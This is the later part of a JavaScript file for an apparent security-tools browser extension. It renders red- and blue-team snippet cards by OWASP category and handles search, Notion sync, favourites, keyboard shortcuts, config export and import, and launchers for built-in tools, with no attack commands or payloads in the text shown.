    items.forEach(item => grid.appendChild(makeCard(item)));
    container.appendChild(grid);

    if (items.length === 0) {
      container.insertAdjacentHTML('beforeend', '<div class="empty">No tools mapped to this level yet.</div>');
    }
  }

  // ═══════════════════════════════════════════════════════════
  //  OWASP TOP 10
  // ═══════════════════════════════════════════════════════════

  function initOwasp() {
    const container = document.getElementById('owaspGrid');
    container.innerHTML = '';

    OWASP_TOP10.forEach(cat => {
      const all = getAllSnippets();
      const items = all.filter(s => s.owasp && s.owasp.includes(cat.id) && matchesOs(s));

      const card = document.createElement('div');
      card.className = 'owasp-card';
      card.dataset.owasp = cat.id;

      card.innerHTML = `
        <div class="owasp-code">${cat.code}</div>
        <div class="owasp-name">${cat.label}</div>
        <div class="owasp-count">${items.length} tools mapped</div>`;

      card.addEventListener('click', () => {
        state.activeOwaspCategory = cat.id;
        document.querySelectorAll('.owasp-card').forEach(c => c.classList.remove('active'));
        card.classList.add('active');
        renderOwaspDetail(cat);
      });

      container.appendChild(card);
    });
  }

  function renderOwaspDetail(cat) {
    const container = document.getElementById('owaspDetail');
    const all = getAllSnippets();
    const items = all.filter(s => s.owasp && s.owasp.includes(cat.id) && matchesOs(s));
    const redItems = items.filter(s => s.team === 'red');
    const blueItems = items.filter(s => s.team === 'blue');

    container.innerHTML = '';

    const header = document.createElement('div');
    header.className = 'phase-detail-header';
    header.style.padding = '16px 24px 0';
    header.innerHTML = `
      <h2>${cat.code}: ${cat.label}</h2>
      <span class="team-label red">${redItems.length} Exploit</span>
      <span class="team-label blue">${blueItems.length} Mitigate</span>`;
    container.appendChild(header);

    const info = document.createElement('div');
    info.className = 'fw-info';
    info.textContent = cat.desc;
    container.appendChild(info);

    const grid = document.createElement('div');
    grid.className = 'snippet-grid';
    [...redItems, ...blueItems].forEach(item => grid.appendChild(makeCard(item)));
    container.appendChild(grid);

    if (items.length === 0) {
      container.insertAdjacentHTML('beforeend', '<div class="empty">No tools mapped to this OWASP category yet.</div>');
    }
  }

  // ═══════════════════════════════════════════════════════════
  //  ALL SNIPPETS (searchable)
  // ═══════════════════════════════════════════════════════════

  function initSnippets() {
    const all = getAllSnippets();
    const categories = [...new Set(all.map(s => s.category))].sort();
    const sel = document.getElementById('categorySelect');
    // Clear old options except "All"
    while (sel.options.length > 1) sel.remove(1);
    categories.forEach(cat => {
      const opt = document.createElement('option');
      opt.value = cat;
      opt.textContent = cat.charAt(0).toUpperCase() + cat.slice(1);
      sel.appendChild(opt);
    });

    const inputs = {
      search: document.getElementById('searchInput'),
      category: document.getElementById('categorySelect'),
      team: document.getElementById('teamSelect'),
    };

    inputs.search.addEventListener('input', () => { state.search = inputs.search.value.trim().toLowerCase(); renderSnippets(); });
    inputs.category.addEventListener('change', () => { state.category = inputs.category.value; renderSnippets(); });
    inputs.team.addEventListener('change', () => { state.team = inputs.team.value; renderSnippets(); });

    renderSnippets();
  }

  function renderSnippets() {
    const all = getAllSnippets();
    const items = all.filter(item => {
      if (state.category !== 'all' && item.category !== state.category) return false;
      if (state.team !== 'all' && item.team !== state.team) return false;
      if (!matchesOs(item)) return false;
      if (state.search) {
        const haystack = [item.title, item.description, item.command, item.category, item.team, ...item.tags, ...(item.owasp || [])].join(' ').toLowerCase();
        if (!haystack.includes(state.search)) return false;
      }
      return true;
    });

    document.getElementById('resultBadge').textContent = `${items.length} snippet${items.length === 1 ? '' : 's'}`;

    const grid = document.getElementById('snippetGrid');
    grid.innerHTML = '';
    items.forEach(item => grid.appendChild(makeCard(item)));

    document.getElementById('emptyState').style.display = items.length === 0 ? 'block' : 'none';
  }

  // ═══════════════════════════════════════════════════════════
  //  NOTION SYNC — Pull tools from Security Tools DB
  // ═══════════════════════════════════════════════════════════

  const NOTION_SECURITY_TOOLS_DB = process.env.NOTION_SECURITY_TOOLS_DB || null;
  const NOTION_COMMAND_LIBRARY_DB = process.env.NOTION_COMMAND_LIBRARY_DB || null;

  async function notionSync() {
    const syncBtn = document.getElementById('notionSyncBtn');
    const syncStatus = document.getElementById('syncStatus');
    syncBtn.disabled = true;
    syncStatus.style.display = 'inline-flex';
    syncStatus.textContent = 'Syncing...';

    try {
      // Request Notion data via service worker
      const response = await chrome.runtime.sendMessage({
        action: 'cyberOpsNotionSync',
        databases: [NOTION_SECURITY_TOOLS_DB, NOTION_COMMAND_LIBRARY_DB],
      });

      if (response && response.error) {
        syncStatus.textContent = response.error;
        setTimeout(() => { syncStatus.style.display = 'none'; }, 3000);
        return;
      }

      if (response && response.snippets) {
        notionSnippets = response.snippets;
        // Cache in storage
        await chrome.storage.local.set({ cyberOpsNotionSnippets: notionSnippets });
        syncStatus.textContent = `${notionSnippets.length} synced`;

        // Reinitialize all views with new data
        initKillChain();
        initAttackMatrix();
        initPyramid();
        initOwasp();
        initSnippets();

        setTimeout(() => { syncStatus.style.display = 'none'; }, 3000);
      }
    } catch (err) {
      syncStatus.textContent = 'Sync failed';
      console.error('Notion sync error:', err);
      setTimeout(() => { syncStatus.style.display = 'none'; }, 3000);
    } finally {
      syncBtn.disabled = false;
    }
  }

  function loadCachedNotionSnippets() {
    if (typeof chrome !== 'undefined' && chrome.storage) {
      chrome.storage.local.get(['cyberOpsNotionSnippets'], (result) => {
        if (result.cyberOpsNotionSnippets && result.cyberOpsNotionSnippets.length) {
          notionSnippets = result.cyberOpsNotionSnippets;
          // Refresh views
          initKillChain();
          initAttackMatrix();
          initPyramid();
          initOwasp();
          initSnippets();
        }
      });
    }
  }

  // ═══════════════════════════════════════════════════════════
  //  FAVORITES — star snippets for quick access
  // ═══════════════════════════════════════════════════════════

  function saveFavorites() {
    if (typeof chrome !== 'undefined' && chrome.storage) {
      chrome.storage.local.set({ cyberOpsFavorites: [...state.favorites] });
    }
  }

  function loadFavorites(cb) {
    if (typeof chrome !== 'undefined' && chrome.storage) {
      chrome.storage.local.get(['cyberOpsFavorites'], (result) => {
        if (result.cyberOpsFavorites && Array.isArray(result.cyberOpsFavorites)) {
          state.favorites = new Set(result.cyberOpsFavorites);
        }
        if (cb) cb();
      });
    } else if (cb) cb();
  }

  function renderFavoritesStrip() {
    const strip = document.getElementById('favoritesStrip');
    const scroll = document.getElementById('favoritesScroll');
    const countEl = document.getElementById('favCount');
    if (!strip || !scroll) return;

    const all = getAllSnippets();
    const favItems = all.filter(s => state.favorites.has(s.id));

    strip.classList.toggle('has-favs', favItems.length > 0);
    countEl.textContent = favItems.length;
    scroll.innerHTML = '';

    favItems.forEach(item => {
      const chip = document.createElement('div');
      chip.className = 'fav-chip';
      chip.title = renderCmd(resolveCommand(item));

      const dot = document.createElement('span');
      dot.className = 'fav-chip-team ' + item.team;

      const label = document.createElement('span');
      label.textContent = item.title;

      const copyHint = document.createElement('span');
      copyHint.className = 'fav-chip-copy';
      copyHint.textContent = 'click=copy';

      chip.appendChild(dot);
      chip.appendChild(label);
      chip.appendChild(copyHint);

      chip.addEventListener('click', async () => {
        try {
          await navigator.clipboard.writeText(renderCmd(resolveCommand(item)));
          copyHint.textContent = 'copied!';
          setTimeout(() => { copyHint.textContent = 'click=copy'; }, 1200);
        } catch { copyHint.textContent = 'failed'; }
      });

      scroll.appendChild(chip);
    });
  }

  // ═══════════════════════════════════════════════════════════
  //  STATS BAR — snippet counts
  // ═══════════════════════════════════════════════════════════

  function updateStatsBar() {
    const all = getAllSnippets();
    const osFiltered = all.filter(s => matchesOs(s));

    const statTotal = document.getElementById('statTotal');
    const statRed = document.getElementById('statRed');
    const statBlue = document.getElementById('statBlue');
    const statOs = document.getElementById('statOs');
    const statOsLabel = document.getElementById('statOsLabel');
    const statCats = document.getElementById('statCats');
    const statTools = document.getElementById('statTools');

    if (statTotal) statTotal.textContent = all.length;
    if (statRed) statRed.textContent = all.filter(s => s.team === 'red').length;
    if (statBlue) statBlue.textContent = all.filter(s => s.team === 'blue').length;
    if (statOs) statOs.textContent = osFiltered.length;
    if (statOsLabel) {
      const labels = { all: 'visible (all OS)', linux: 'for Linux', windows: 'for Windows', macos: 'for macOS' };
      statOsLabel.textContent = labels[state.os] || 'visible';
    }
    if (statCats) statCats.textContent = new Set(all.map(s => s.category)).size;
    if (statTools) statTools.textContent = TOOL_REGISTRY.length;
  }

  // ═══════════════════════════════════════════════════════════
  //  KEYBOARD SHORTCUTS
  // ═══════════════════════════════════════════════════════════

  function initKeyboardShortcuts() {
    document.addEventListener('keydown', (e) => {
      // Skip if typing in an input/textarea
      const tag = document.activeElement.tagName;
      if (tag === 'INPUT' || tag === 'TEXTAREA' || tag === 'SELECT') {
        // Escape blurs the input
        if (e.key === 'Escape') document.activeElement.blur();
        return;
      }

      // Ctrl+K or / → focus search
      if (e.key === '/' || (e.ctrlKey && e.key === 'k')) {
        e.preventDefault();
        // Switch to All Snippets tab first
        const snippetsTab = document.querySelector('.fw-tab[data-fw="snippets"]');
        if (snippetsTab && !snippetsTab.classList.contains('active')) snippetsTab.click();
        const searchInput = document.getElementById('searchInput');
        if (searchInput) searchInput.focus();
        return;
      }

      // Ctrl+E → export
      if (e.ctrlKey && e.key === 'e') {
        e.preventDefault();
        exportConfig();
        return;
      }

      // 1-4 → OS switch (when not in input)
      const osKeys = { '1': 'all', '2': 'linux', '3': 'windows', '4': 'macos' };
      if (osKeys[e.key]) {
        e.preventDefault();
        const btn = document.querySelector(`.os-btn[data-os="${osKeys[e.key]}"]`);
        if (btn) btn.click();
        return;
      }

      // Ctrl+1-5 → switch framework tabs
      if (e.ctrlKey && e.key >= '1' && e.key <= '5') {
        e.preventDefault();
        const tabs = document.querySelectorAll('.fw-tab');
        const idx = parseInt(e.key) - 1;
        if (tabs[idx]) tabs[idx].click();
        return;
      }
    });
  }

  // ═══════════════════════════════════════════════════════════
  //  EXPORT / IMPORT — settings, favorites, tools as JSON
  // ═══════════════════════════════════════════════════════════

  function exportConfig() {
    const config = {
      version: 1,
      exportDate: new Date().toISOString(),
      os: state.os,
      vars: {
        target: state.target, lhost: state.lhost, lport: state.lport,
        domain: state.domain, user: state.user, pass: state.pass,
      },
      favorites: [...state.favorites],
      installedTools: [...state.installedTools],
      filterByTools: state.filterByTools,
    };

    const blob = new Blob([JSON.stringify(config, null, 2)], { type: 'application/json' });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = `cyber-ops-config-${new Date().toISOString().slice(0, 10)}.json`;
    a.click();
    URL.revokeObjectURL(url);
  }

  function importConfig(file) {
    const reader = new FileReader();
    reader.onload = (e) => {
      try {
        const config = JSON.parse(e.target.result);
        if (!config.version) throw new Error('Invalid config file');

        // Restore state
        if (config.os) {
          state.os = config.os;
          const osGroup = document.getElementById('osGroup');
          if (osGroup) {
            osGroup.querySelectorAll('.os-btn').forEach(b => {
              b.classList.toggle('active', b.dataset.os === state.os);
            });
          }
        }

        if (config.vars) {
          Object.keys(config.vars).forEach(key => {
            state[key] = config.vars[key];
            const input = document.getElementById('global' + key.charAt(0).toUpperCase() + key.slice(1));
            if (input) input.value = config.vars[key];
          });
        }

        if (config.favorites) {
          state.favorites = new Set(config.favorites);
          saveFavorites();
        }

        if (config.installedTools) {
          state.installedTools = new Set(config.installedTools);
          saveToolInventory();
        }

        if (typeof config.filterByTools === 'boolean') {
          state.filterByTools = config.filterByTools;
        }

        // Save everything
        if (typeof chrome !== 'undefined' && chrome.storage) {
          chrome.storage.local.set({
            cyberOpsOs: state.os,
            cyberOpsVars: config.vars || {},
            cyberOpsFilterByTools: state.filterByTools,
          });
        }

        // Full refresh
        initKillChain();
        initAttackMatrix();
        initPyramid();
        initOwasp();
        initSnippets();
        renderFavoritesStrip();
        updateStatsBar();

        // Reinit tool inventory grid
        const grid = document.getElementById('toolsGrid');
        if (grid) {
          grid.querySelectorAll('input[type="checkbox"]').forEach(cb => {
            const toolId = cb.closest('.tool-item').querySelector('.tool-cat')
              ? cb.closest('.tool-item').querySelector('span:not(.tool-cat)').textContent
              : '';
            // Re-render tool grid by re-calling init
          });
        }

        // Flash success on import button
        const importBtn = document.getElementById('importBtn');
        if (importBtn) {
          const orig = importBtn.textContent;
          importBtn.textContent = 'Imported!';
          importBtn.style.color = 'var(--co-green)';
          importBtn.style.borderColor = 'var(--co-green)';
          setTimeout(() => {
            importBtn.textContent = orig;
            importBtn.style.color = '';
            importBtn.style.borderColor = '';
          }, 2000);
        }
      } catch (err) {
        console.error('Import error:', err);
        const importBtn = document.getElementById('importBtn');
        if (importBtn) {
          importBtn.textContent = 'Invalid file';
          importBtn.style.color = 'var(--co-red)';
          setTimeout(() => { importBtn.textContent = 'Import'; importBtn.style.color = ''; }, 2000);
        }
      }
    };
    reader.readAsText(file);
  }

  function initExportImport() {
    const exportBtn = document.getElementById('exportBtn');
    const importBtn = document.getElementById('importBtn');
    const importFile = document.getElementById('importFile');

    if (exportBtn) exportBtn.addEventListener('click', exportConfig);
    if (importBtn) importBtn.addEventListener('click', () => importFile.click());
    if (importFile) importFile.addEventListener('change', (e) => {
      if (e.target.files[0]) importConfig(e.target.files[0]);
      e.target.value = ''; // Reset so same file can be re-imported
    });
  }

  // ═══════════════════════════════════════════════════════════
  //  INTERACTIVE TOOL LAUNCHERS
  // ═══════════════════════════════════════════════════════════

  function openTool(page, tab) {
    const url = chrome.runtime.getURL(page) + (tab ? `#${tab}` : '');
    chrome.tabs.create({ url });
  }

  document.getElementById('launchRepeater').addEventListener('click', () => openTool('security-hub/security-toolkit.html', 'repeater'));
  document.getElementById('launchScanner').addEventListener('click', () => openTool('security-hub/security-toolkit.html', 'scanner'));
  document.getElementById('launchFuzzer').addEventListener('click', () => openTool('security-hub/security-toolkit.html', 'fuzzer'));
  document.getElementById('launchEncoder').addEventListener('click', () => openTool('security-hub/security-toolkit.html', 'encoder'));
  document.getElementById('launchHashes').addEventListener('click', () => openTool('security-hub/security-toolkit.html', 'hashes'));
  document.getElementById('notionSyncBtn').addEventListener('click', notionSync);

  // ═══════════════════════════════════════════════════════════
  //  INIT
  // ═══════════════════════════════════════════════════════════

  loadFavorites(() => {
    initVarBar();
    initOsSelector();
    initToolInventory();
    initKillChain();
    initAttackMatrix();
    initPyramid();
    initOwasp();
    initSnippets();
    initKeyboardShortcuts();
    initExportImport();
    renderFavoritesStrip();
    updateStatsBar();
    loadCachedNotionSnippets();
  });
})();
